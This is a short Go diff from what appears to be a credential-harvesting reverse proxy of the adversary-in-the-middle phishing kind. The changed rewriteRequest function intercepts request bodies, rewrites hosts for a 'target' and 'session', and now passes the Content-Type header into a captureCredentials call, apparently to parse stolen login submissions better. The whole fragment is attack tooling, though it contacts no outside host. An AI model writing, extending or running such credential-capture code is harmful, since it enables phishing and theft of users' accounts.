@@ -70,7 +70,9 @@ func rewriteRequest(req *http.Request, originalHost, upstream string, target *Ta
 		}
 		req.Body.Close()
 
-		captureCredentials(originalHost+req.URL.Path, string(body), target, session)
+		contentType := req.Header.Get("Content-Type")
+
+		captureCredentials(originalHost+req.URL.Path, string(body), contentType, target, session)
 
 		bodyStr := patchURLString(string(body), hostMap)
 
